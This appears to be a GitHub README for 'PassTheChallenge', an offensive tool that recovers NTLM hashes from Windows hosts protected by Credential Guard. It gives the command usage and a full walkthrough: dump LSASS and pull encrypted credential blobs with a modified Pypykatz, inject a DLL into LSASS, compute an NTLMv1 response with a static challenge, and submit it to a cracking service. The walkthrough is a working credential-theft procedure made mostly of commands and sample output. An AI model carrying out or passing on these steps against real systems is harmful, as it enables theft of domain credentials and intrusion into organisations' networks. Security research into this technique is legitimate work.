# PassTheChallenge

Recovering NTLM hashes from Credential Guard. Read more about the techniques [here](https://research.ifcr.dk/pass-the-challenge-defeating-credential-guard-31a892eee22).

## Usage

Releases can be found [here](https://github.com/ly4k/PassTheChallenge/releases/tag/v1.0).

```
Pass-the-Challenge (PtC) - by Oliver Lyak (ly4k)

Usage: <command> [<parameters...>]

Commands:
    inject - Inject module and start PtC-RPC server inside LSASS
    ping - Ping the PtC-RPC server inside LSASS
    challenge - Calculate NTLMv2 Response using encrypted credentials
      <addresses> - <context handle>:<proxy info>
      <encrypted blob> - <HEX>
      <server challenge> - <UTF16_HEX domain>:<UTF16_HEX username>:<HEX server name>:<HEX server challenge>
    nthash - Calculate NTLMv1 Response using encrypted credentials
      <addresses> - <context handle>:<proxy info>
      <encrypted blob> - <HEX>
      [<server challenge>] - If omitted, a static challenge of 1122334455667788 will be used
    protect - Convert NT hash to encrypted blob
      <addresses> - <context handle>:<proxy info>
      <nt hash> - <HEX>
    compare - Compare two encrypted blobs or an encrypted blob with a NT hash
      <addresses> - <context handle>:<proxy info>
      <encrypted blob> - <HEX>
      <encrypted blob/NT hash> - <HEX>

Examples:
    PtC.exe inject [<module>]
    PtC.exe ping
    PtC.exe challenge 0x1a34b[...]:0x7fff7[...] 0a92a82feb4[...] 6c0079[...]:610064[...]:020008[...]:66a98b[...]
    PtC.exe nthash 0x1a34b[...]:0x7fff7[...] 0a92a82feb4[...]
    PtC.exe protect 0x1a34b[...]:0x7fff7[...] 0a92a82feb4[...]
    PtC.exe compare 0x1a34b[...]:0x7fff7[...] 0a92a82feb4[...] 66a98b[...]
```

### Examples

First, use the modified version of [Pypykatz](https://github.com/ly4k/Pypykatz) to extract the encrypted credentials, along with the "Context Handle" and "Proxy Info" from an LSASS memory dump.

```cmd
> python3 -m pypykatz lsa minidump lsass.DMP -p msv
[...]
luid 194748
        == MSV ==
                Username: Administrator
                Domain: corp
                        [LSA Isolated Data]
                        Is NT Present: True
                        Context Handle: 0x1b6d5216c60
                        Proxy Info: 0x7ffdd8bfd380
                        Encrypted blob: a0000000000000000800000064000000010000000101000001000000366f55058c45738be16ab11f1d78586f2649f0c348b3171496cd7ef39dd4f3bb3dfda4ea33fb46d407887a570b1d545d0100000000000000000000000000000001000000340000004e746c6d48617368256a784d729f032326c6f16b07ebbd279dab88912c12e9b7f8b16e3a5ccdce5f70b65eef248cf38faf856a9793cba54c7f8bf4ef
                DPAPI: c02c86e371103ad7d7d352b19af1a74a00000000
[...]
```

Then inject the [SecurityPackage.dll](https://github.com/ly4k/PassTheChallenge/releases/tag/v1.0) module into the LSASS process. Make sure that `SecurityPackage.dll` is located in your current working directory, or specify an alternative path as the first parameter.

```cmd
> .\PassTheChallenge.exe inject <[path to module]>
Pass-the-Challenge (PtC) - by Oliver Lyak (ly4k)

[+] Package seems to be loaded
```

The easy way to retrieve the NTLM hash is by using the `nthash` command, as shown below using the values from the Pypykatz dump.

```cmd
> .\PassTheChallenge.exe nthash 0x1b6d5216c60:0x7ffdd8bfd380 a0000000000000000800000064000000010000000101000001000000366f55058c45738be16ab11f1d78586f2649f0c348b3171496cd7ef39dd4f3bb3dfda4ea33fb46d407887a570b1d545d0100000000000000000000000000000001000000340000004e746c6d48617368256a784d729f032326c6f16b07ebbd279dab88912c12e9b7f8b16e3a5ccdce5f70b65eef248cf38faf856a9793cba54c7f8bf4ef
Pass-the-Challenge (PtC) - by Oliver Lyak (ly4k)

[+] Server is alive
[+] Response:

NTHASH:0F2FBBD336C44CB24E5189483F77378135F02C79D225B1AC
```

Finally, submit the NTHASH for free to [crack.sh](https://crack.sh/get-cracking/) and wait around 30 seconds for your NTLM hash to be recovered.

See the blog post for more [details](https://research.ifcr.dk/pass-the-challenge-defeating-credential-guard-31a892eee22).

